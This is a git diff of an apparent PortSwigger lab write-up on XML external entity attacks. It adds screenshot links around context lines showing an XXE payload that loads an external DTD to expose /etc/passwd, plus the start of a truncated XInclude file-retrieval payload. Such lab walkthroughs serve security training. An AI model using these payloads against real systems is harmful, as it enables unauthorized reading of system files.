@@ -137,6 +137,13 @@ Insert the following external entity definition in between the XML declaration a
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 You should see an error message containing the contents of the /etc/passwd file.
 
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/9cc4030b-36e0-4db9-b074-d0fb75f02743)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/149116f0-4048-410c-bd71-67312ef4efb1)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/5843d19f-7aea-4a92-93b0-c717998d9b0d)
+
+![image](https://github.com/SURYASNAIR1/PortSwigger/assets/123303806/868353a3-b7ed-4c08-8818-fe6849bd76b3)
 
 **Lab: Exploiting XInclude to retrieve files**
 
@@ -150,3 +157,4 @@ Visit a product page, click "Check stock", and intercept the resulting POST requ
 Set the value of the productId parameter to:
 
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" 
+
